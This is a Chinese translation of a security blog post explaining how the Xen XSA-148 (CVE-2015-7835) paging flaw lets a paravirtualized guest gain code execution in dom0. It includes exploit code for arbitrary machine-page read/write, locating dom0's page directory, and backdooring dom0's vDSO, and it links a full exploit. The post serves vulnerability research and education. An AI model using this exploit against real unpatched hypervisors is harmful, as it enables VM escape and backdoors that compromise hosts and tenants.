---
layout: post
title: "Xen攻击第二篇：XSA-148--从guest到host"
---

**原链: <http://blog.quarkslab.com/xen-exploitation-part-2-xsa-148-from-guest-to-host.html>**

**作者: Jeremie Boutoille**

**译者: Au2o3t@GearTeam**

**审校: Terence@GearTeam**

**Xen作现代虚拟化平台的一个重要代表,它的安全性值得全世界黑客的关注。本文将继续介绍 XSA-148(1)的利用,漏洞编号CVE-2015-7835,由阿里巴巴的栾尚聪发现并于2015年10月公开披露。今年年初,漏洞发现者作了一次分享(6)并提供了他巧妙的漏洞利用,这里我们选择继续发表本文的一个主要原因是我们的利用实现有点不一样。**

为更好的理解本文,你可能需要了解一些基本的 x86 内存架构,这里我们尽可能写得详细清晰。本文中我们会先讨论该漏洞,接下来会演示如何通过一个普通的客户机DomU穿透到Dom0 环境中执行任意代码的利用过程。

<!-- more -->

(文章较长,可以看这里的视频)

(视频见:<https://asciinema.org/a/cwm26vzbjqx0d3eseic51igho>)

![][1]

# XSA-148漏洞描述

公告上说(1):

```
Xen 安全公告 CVE-2015-7835 / XSA-148,第四版

x86:PV客户机不受控的创建大页映射

问题描述

=============

当满足一定条件时,Xen中验证2级页表项的代码将被绕过,PV 客户机可以通过大页映射创建可写的内存映射。

这将破坏Xen环境中内存页预期的“不变性”,使只读的页面变得可写。

即使未使用 “allowsuperpage” 命令行选项也能够实现上述绕过。
```

这里叙述的是2级页表,大页,半虚拟化客户机以及 Xen “不变性”。我们必须理解这些概念。

## 内存管理,页表及大页

如公告所述,仅 x86 架构的客户机受到影响。这里对x86下的MMU进行介绍。MMU的目的是将虚拟地址(也叫线性地址)转换为物理地址。这是通过使用众所周知的分段和分页机制实现的。

之前发表的 XSA-105(8) 中已经介绍过分段,分页就在分段之后,只是要稍微复杂些。

![][2]

分页模式有三种,主要区别是不同的可被翻译的线性地址的大小不同,物理地址的大小不同以及页面大小不同。这里我们只讨论 IA-32e 模式,这是 Intel 64 架构的唯一可用模式。

在分页模式下,CR3 寄存器中保存了一个表的物理地址,CPU 取线性地址某些位转换为当前表的条目号,条目中对应给出下一表的物理基址。

![][3]

如图所示,共有4级页表,它们的命名在 Xen,Linux 和 Intel 术语中各有不同:

![][4]

公告中提到了大页。如前所述,分页允许映射大小不同的页面,IA-32e让你可以映射 1GB页,2MB 页或者 4KB 页。2MB 页通常被称为大页。其差别在于 L2 的条目,它直接关联到 2MB 页,而不是指向 L1页表。这可以通过设置 L2 条目中的 PSE 标志(此标志在 Intel 文档中被称为 PS )实现。我们将在本文中努力使用统一的术语,但本文仍将出现这三类术语。

![][5]

## PV 客户机和 MMU

X86半虚拟化的内存管理在Xen wiki(3)上有比较详细的介绍。基本上,你需要知道的是:

* PV 客户机内核运行在3环,
* PV 客户机使用直接分页:Xen 不为伪物理内存和实机地址之间增加抽象层,
* PV 客户机需执行超级调用(HYPERVISOR_mmu_update)来更新页表,
* 每次执行 HYPERVISOR_mmu_update 时,Xen 检查“不变性”,如:“一个已被引用的页如L4/L3/L2 / L1不能被另一个虚拟地址映射为可写的”。这些“不变性”必须得到保证,以确保客户机不能破坏整个系统。

## 漏洞

有了以上知识,我们就不难理解公告内容了。似乎有可能创建一个可写的页表,之后,由于直接分页,那么就可以以读写权限映射任意宿主机的页面到客户机虚拟内存了。

我们来看看补丁的差异:

```
x86: guard against undue super page PTE creation

When optional super page support got added (commit bd1cd81d64 "x86: PV
support for hugepages"), two adjustments were missed: mod_l2_entry()
needs to consider the PSE and RW bits when deciding whether to use the
fast path, and the PSE bit must not be removed from L2_DISALLOW_MASK
unconditionally.

This is XSA-148.

Signed-off-by: Jan Beulich <jbeulich@suse.com>
Reviewed-by: Tim Deegan <tim@xen.org>

--- a/xen/arch/x86/mm.c
+++ b/xen/arch/x86/mm.c
@@ -160,7 +160,10 @@ static void put_superpage(unsigned long
 static uint32_t base_disallow_mask;
 /* Global bit is allowed to be set on L1 PTEs. Intended for user mappings. */
 #define L1_DISALLOW_MASK ((base_disallow_mask | _PAGE_GNTTAB) & ~_PAGE_GLOBAL)
-#define L2_DISALLOW_MASK (base_disallow_mask & ~_PAGE_PSE)
+
+#define L2_DISALLOW_MASK (unlikely(opt_allow_superpage) \
+                          ? base_disallow_mask & ~_PAGE_PSE \
+                          : base_disallow_mask)

 #define l3_disallow_mask(d) (!is_pv_32bit_domain(d) ? \
                              base_disallow_mask : 0xFFFFF198U)
@@ -1841,7 +1844,10 @@ static int mod_l2_entry(l2_pgentry_t *pl
         }

         /* Fast path for identical mapping and presence. */
-        if ( !l2e_has_changed(ol2e, nl2e, _PAGE_PRESENT) )
+        if ( !l2e_has_changed(ol2e, nl2e,
+                              unlikely(opt_allow_superpage)
+                              ? _PAGE_PSE | _PAGE_RW | _PAGE_PRESENT
+                              : _PAGE_PRESENT) )
         {
             adjust_guest_l2e(nl2e, d);
             if ( UPDATE_ENTRY(l2, pl2e, ol2e, nl2e, pfn, vcpu, preserve_ad) )
```

L2_DISALLOW_MASK 从 base_disallow_mask 中去掉 PSE 标志,在这里:

```
void __init arch_init_memory(void)
{
    unsigned long i, pfn, rstart_pfn, rend_pfn, iostart_pfn, ioend_pfn;
    /* Basic guest-accessible flags: PRESENT, R/W, USER, A/D, AVAIL[0,1,2] */
    base_disallow_mask = ~(_PAGE_PRESENT|_PAGE_RW|_PAGE_USER|
                           _PAGE_ACCESSED|_PAGE_DIRTY|_PAGE_AVAIL);
```

因此,若没有补丁,客户机可以采用快速路径设置 L2 条目中的 PSE 标志,即使未设置 “allowsuperpage”选项。

若条目以及 `_PAGE_PRESENT` 未变,仅采用快速路径:

```
/* Update the L2 entry at pl2e to new value nl2e. pl2e is within frame pfn. */
static int mod_l2_entry(l2_pgentry_t *pl2e,
                        l2_pgentry_t nl2e,
                        unsigned long pfn,
                        int preserve_ad,
                        struct vcpu *vcpu)
{
    l2_pgentry_t ol2e;
    struct domain *d = vcpu->domain;
    struct page_info *l2pg = mfn_to_page(pfn);
    unsigned long type = l2pg->u.inuse.type_info;
    int rc = 0;

    if ( unlikely(!is_guest_l2_slot(d, type, pgentry_ptr_to_slot(pl2e))) )
    {
        MEM_LOG("Illegal L2 update attempt in Xen-private area %p", pl2e);
        return -EPERM;
    }

    if ( unlikely(__copy_from_user(&ol2e, pl2e, sizeof(ol2e)) != 0) )
        return -EFAULT;

    if ( l2e_get_flags(nl2e) & _PAGE_PRESENT )
    {
        if ( unlikely(l2e_get_flags(nl2e) & L2_DISALLOW_MASK) )
        {
            MEM_LOG("Bad L2 flags %x",
                    l2e_get_flags(nl2e) & L2_DISALLOW_MASK);
            return -EINVAL;
        }

        /* Fast path for identical mapping and presence. */
        if ( !l2e_has_changed(ol2e, nl2e, _PAGE_PRESENT) )
        {
            adjust_guest_l2e(nl2e, d);
            if ( UPDATE_ENTRY(l2, pl2e, ol2e, nl2e, pfn, vcpu, preserve_ad) )
                return 0;
            return -EBUSY;
        }
```

整合起来,漏洞利用过程如下:

* 取一个虚拟地址,
* 设置其对应的 L2 条目中的 PSE 标志,
* 以写权限访问整个 L1表 并构造表项绕过 Xen “不变性”,
* 取消之前设置的 PSE 标志,
* 访问任意物理页 :)。

QubesOS 的公告也有此漏洞的详细解释(4)。

# 利用

## 映射任意实机页面

我相信你掌握了实质,但这里仍有一个小问题:当 PSE 标志在 L2 条目中被设置,一些 L1地址的保留位应保持清除。

![][6]

因此,需要找到一个保留位为0的可用的页帧号。 这可以通过Linux 分配器使用 `__get_free_pages` 函数请求 2MB连续内存来完成。

```
// get an aligned mfn
aligned_mfn_va = (void*) __get_free_pages(__GFP_ZERO, 9);
DEBUG("aligned_mfn_va = %p", aligned_mfn_va);
DEBUG("aligned_mfn_va mfn = 0x%lx", __machine_addr(aligned_mfn_va));
page_walk((unsigned long) aligned_mfn_va);
```

2MB 内存映射的PSE 标记已经被设置,我们需要预备 2MB 虚拟内存,因为我们不希望其他客户机与那些虚拟地址交互。

```
// get a 2Mb virtual memory
l2_entry_va = (void*) __get_free_pages(__GFP_ZERO, 9);
DEBUG("l2_entry_va = %p", l2_entry_va);
DEBUG("l2_entry_va mfn = 0x%lx", __machine_addr(l2_entry_va));
page_walk((unsigned long) l2_entry_va);
```

现在,取保留位为0的页帧号,并用在我们预备的 2MB 虚拟地址范围的 L2 值。这是必须的,因为这个预备的范围的 L2 值的保留位已置为1。因对齐的页帧号在别的地方映射为写权限,我们必须取消对应条目的 RW 标志来保持 Xen “不变性”。这些在 startup_dump 函数中实现:

```
int startup_dump(unsigned long l2_entry_va, unsigned long aligned_mfn_va)
{
        pte_t *pte_aligned = get_pte(aligned_mfn_va);
        pmd_t *pmd = get_pmd(l2_entry_va);
        int rc;

        // removes RW bit on the aligned_mfn_va's pte
        rc = mmu_update(__machine_addr(pte_aligned) | MMU_NORMAL_PT_UPDATE, pte_aligned->pte & ~_PAGE_RW);
        if(rc < 0)
        {
                printk("cannot unset RW flag on PTE (0x%lx)\n", aligned_mfn_va);
                return -1;
        }

        // map.
        rc = mmu_update(__machine_addr(pmd) | MMU_NORMAL_PT_UPDATE, (__mfn((void*) aligned_mfn_va) << PAGE_SHIFT) | PMD_FLAG);
        if(rc < 0)
        {
                printk("cannot update L2 entry 0x%lx\n", l2_entry_va);
                return -1;
        }

        return 0;
}
```

如此,我们能够使用 do_page_buff 函数读写任意实物理页面了:

```
void do_page_buff(unsigned long mfn, char *buff, int what)
{
        set_l2_pse_flag((unsigned long) l2_entry_va);
        *(unsigned long*) l2_entry_va = (mfn << PAGE_SHIFT) | PTE_FLAG;
        unset_l2_pse_flag((unsigned long) l2_entry_va);

        if(what == DO_PAGE_READ)
        {
                memcpy(buff, l2_entry_va, PAGE_SIZE);
        }
        else if (what == DO_PAGE_WRITE)
        {
                memcpy(l2_entry_va, buff, PAGE_SIZE);
        }

        set_l2_pse_flag((unsigned long) l2_entry_va);
        *(unsigned long*) l2_entry_va = 0;
        unset_l2_pse_flag((unsigned long) l2_entry_va);
}
```

## dom0 中执行代码

好了,我们能够读写任意实物理页面了,困难的是找到一些有趣的东西。dom0 的页目录是个不错的目标,这应该让我们解决任何虚拟地址到对应的物理页的映射,那时可以写入进程内存来执行一些任意代码,或是在任意进程中发现一个有趣的页面映射(如 vDSO ;))。

由于 Xen 的内存布局,很容易找到一个像页目录的页面(xen/include/asm-x86/config.h):

```
/*
 * Memory layout:
 *  0x0000000000000000 - 0x00007fffffffffff [128TB, 2^47 bytes, PML4:0-255]
 *    Guest-defined use (see below for compatibility mode guests).
 *  0x0000800000000000 - 0xffff7fffffffffff [16EB]
 *    Inaccessible: current arch only supports 48-bit sign-extended VAs.
 *  0xffff800000000000 - 0xffff803fffffffff [256GB, 2^38 bytes, PML4:256]
 *    Read-only machine-to-phys translation table (GUEST ACCESSIBLE).
 *  0xffff804000000000 - 0xffff807fffffffff [256GB, 2^38 bytes, PML4:256]
 *    Reserved for future shared info with the guest OS (GUEST ACCESSIBLE).
 *  0xffff808000000000 - 0xffff80ffffffffff [512GB, 2^39 bytes, PML4:257]
 *    ioremap for PCI mmconfig space
 *  0xffff810000000000 - 0xffff817fffffffff [512GB, 2^39 bytes, PML4:258]
 *    Guest linear page table.
 *  0xffff818000000000 - 0xffff81ffffffffff [512GB, 2^39 bytes, PML4:259]
 *    Shadow linear page table.
 *  0xffff820000000000 - 0xffff827fffffffff [512GB, 2^39 bytes, PML4:260]
 *    Per-domain mappings (e.g., GDT, LDT).
 *  0xffff828000000000 - 0xffff82bfffffffff [256GB, 2^38 bytes, PML4:261]
 *    Machine-to-phys translation table.
 *  0xffff82c000000000 - 0xffff82cfffffffff [64GB,  2^36 bytes, PML4:261]
 *    vmap()/ioremap()/fixmap area.
 *  0xffff82d000000000 - 0xffff82d03fffffff [1GB,   2^30 bytes, PML4:261]
 *    Compatibility machine-to-phys translation table.
 *  0xffff82d040000000 - 0xffff82d07fffffff [1GB,   2^30 bytes, PML4:261]
 *    High read-only compatibility machine-to-phys translation table.
 *  0xffff82d080000000 - 0xffff82d0bfffffff [1GB,   2^30 bytes, PML4:261]
 *    Xen text, static data, bss.
#ifndef CONFIG_BIGMEM
 *  0xffff82d0c0000000 - 0xffff82dffbffffff [61GB - 64MB,       PML4:261]
 *    Reserved for future use.
 *  0xffff82dffc000000 - 0xffff82dfffffffff [64MB,  2^26 bytes, PML4:261]
 *    Super-page information array.
 *  0xffff82e000000000 - 0xffff82ffffffffff [128GB, 2^37 bytes, PML4:261]
 *    Page-frame information array.
 *  0xffff830000000000 - 0xffff87ffffffffff [5TB, 5*2^40 bytes, PML4:262-271]
 *    1:1 direct mapping of all physical memory.
#else
 *  0xffff82d0c0000000 - 0xffff82ffdfffffff [188.5GB,           PML4:261]
 *    Reserved for future use.
 *  0xffff82ffe0000000 - 0xffff82ffffffffff [512MB, 2^29 bytes, PML4:261]
 *    Super-page information array.
 *  0xffff830000000000 - 0xffff847fffffffff [1.5TB, 3*2^39 bytes, PML4:262-264]
 *    Page-frame information array.
 *  0xffff848000000000 - 0xffff87ffffffffff [3.5TB, 7*2^39 bytes, PML4:265-271]
 *    1:1 direct mapping of all physical memory.
#endif
 *  0xffff880000000000 - 0xffffffffffffffff [120TB,             PML4:272-511]
 *    PV: Guest-defined use.
 *  0xffff880000000000 - 0xffffff7fffffffff [119.5TB,           PML4:272-510]
 *    HVM/idle: continuation of 1:1 mapping
 *  0xffffff8000000000 - 0xffffffffffffffff [512GB, 2^39 bytes  PML4:511]
 *    HVM/idle: unused
 *
 * Compatibility guest area layout:
 *  0x0000000000000000 - 0x00000000f57fffff [3928MB,            PML4:0]
 *    Guest-defined use.
 *  0x00000000f5800000 - 0x00000000ffffffff [168MB,             PML4:0]
 *    Read-only machine-to-phys translation table (GUEST ACCESSIBLE).
 *  0x0000000100000000 - 0x0000007fffffffff [508GB,             PML4:0]
 *    Unused.
 *  0x0000008000000000 - 0x000000ffffffffff [512GB, 2^39 bytes, PML4:1]
 *    Hypercall argument translation area.
 *  0x0000010000000000 - 0x00007fffffffffff [127TB, 2^46 bytes, PML4:2-255]
 *    Reserved for future use.
 */
 ```

如你接下来要看到的,每个半虚拟化客户机都有一些与 Xen 有关的表映射到其自身的虚拟内存:机器地址到物理地址转换表,Xen 代码等。这些映射对每一个客户机而言都是一样的,我们可以尝试寻找物理页,它在于客户机相同的偏移处具有相同的值。同时,由于 dom0 使用的是半虚拟化 Linux 内核,偏移 510 和 511 不应被置为0(0xFFFFFFFF……地址)。这也是我们正在做的,以找到一个潜在的页目录:

```
for(page=0; page<MAX_MFN; page++)
{
        dump_page_buff(page, buff);
        if(current_tab[261] == my_pgd[261] &&
           current_tab[262] == my_pgd[262] &&
           current_tab[511] != 0 &&
           current_tab[510] != 0 &&
           __mfn(my_pgd) != page)
        {
                ...
        }
}
```

有一个潜在的页目录是不够的,我们要肯定的它是 dom0 的页目录。

解决方案就在 start_info 结构中。这种结构会在 Xen 启动时自动映射在每个半虚拟化客户机(包括 dom0)的虚拟地址空间,且包含一些有用的信息:

```
struct start_info {
    char magic[32];             /* "xen-<version>-<platform>".            */
    ...
    uint32_t flags;             /* SIF_xxx flags.                         */
    ...
};
```

你可以看到,start_info 结构起始处有个魔数,包含标记字段。我们只需要解析整个页目录对应的页开始处的魔数:

```
int is_startup_info_page(char *page_data)
{
        int ret = 0;
        char marker[] = "xen-3.0-x86";
        if(memcmp(page_data, marker, sizeof(marker)-1) == 0)
        {
                ret = 1;
        }
        return ret;
}
```

可以通过检查 SIF_INITDOMAIN 标志是否设置来判断页目录是否属于 dom0。

```
for(page=0; page<MAX_MFN; page++)
{
        dump_page_buff(page, buff);
        if(current_tab[261] == my_pgd[261] &&
           current_tab[262] == my_pgd[262] &&
           current_tab[511] != 0 &&
           current_tab[510] != 0 &&
           __mfn(my_pgd) != page)
        {
                tmp = find_start_info_into_L4(page, (pgd_t*) buff);
                if(tmp != 0)
                {
                        // we find a valid start_info page
                        DEBUG("start_info page : 0x%x", tmp);
                        dump_page_buff(tmp, buff);

                        if(start_f->flags & SIF_INITDOMAIN)
                        {
                                DEBUG("dom0!");
                        } else {
                                DEBUG("not dom0");
                        }
                }
        }
}
```

这样,我们可以如同 scumjr 的 SMM后门[5]一样,在 dom0 的 vDSO 中设置后门了。在他的博文中说,vDSO 库由 Linux 内核映射到每个用户进程,很容易发现它。因此,我们只需要解析一次页目录,搜索 vDSO 并给它植入一个后门。

```
if(start_f->flags & SIF_INITDOMAIN)
{
        DEBUG("dom0!");
        dump_page_buff(page, buff);
        tmp = find_vdso_into_L4(page, (pgd_t*) buff);

        if(tmp != 0)
        {
                DEBUG("dom0 vdso : 0x%x", tmp);
                patch_vdso(tmp);
                DEBUG("patch.");
                break;
        }
}
```

* 演示:<https://asciinema.org/a/cwm26vzbjqx0d3eseic51igho>
* 完整利用:<http://blog.quarkslab.com/resources/2016-07-12_xsa-148/code/xsa148_exploit.tar.gz>

# 结论

这个可能是 Xen 有史以来最严重的漏洞,它在被发现前已经存在了7年。如本文所述,利用它来实现 dom0 内代码执行并不难。可以做比修补 vDSO 更多的事,如栾尚聪选择的是超级调用页。

原来这第二部分应该是最后一篇……但我们最近发现了一个新的漏洞可以让客户机逃逸。相关公告已经在昨天公开披露(XSA-182(9),CVE-2016-6258(10)),下篇我们将介绍如何编写一个完整的利用。敬请关注!

(1) (1, 2) <http://xenbits.xen.org/xsa/advisory-148.html>

(2) <http://download.intel.com/design/processor/manuals/253668.pdf>

(3) <http://wiki.xen.org/wiki/X86_Paravirtualised_Memory_Management>

(4) <https://github.com/QubesOS/qubes-secpack/blob/master/QSBs/qsb-022-2015.txt>

(5) <https://scumjr.github.io/2016/01/10/from-smm-to-userland-in-a-few-bytes/>

(6) (1, 2) <https://conference.hitb.org/hitbsecconf2016ams/sessions/advanced-exploitation-xen-hypervisor-vm-escape/>

(7) <https://www.blackhat.com/us-16/briefings.html#ouroboros-tearing-xen-hypervisor-with-the-snake>

(8) <http://blog.quarkslab.com/xen-exploitation-part-1-xsa-105-from-nobody-to-root.html>

(9) <http://xenbits.xen.org/xsa/advisory-182.html>

(10) <http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6258>

[1]: https://p1.ssl.qhimg.com/t01cc39f6c4744f14d5.png
[2]: https://p1.ssl.qhimg.com/t0191f3c2792bba6bd5.png
[3]: https://p5.ssl.qhimg.com/t0192921f0ec6d29bc3.png
[4]: https://p2.ssl.qhimg.com/t019c7724c77a43882b.jpg
[5]: https://p3.ssl.qhimg.com/t01bb8352a38dc19d64.png
[6]: https://p4.ssl.qhimg.com/t01a55b8953562a62ed.png
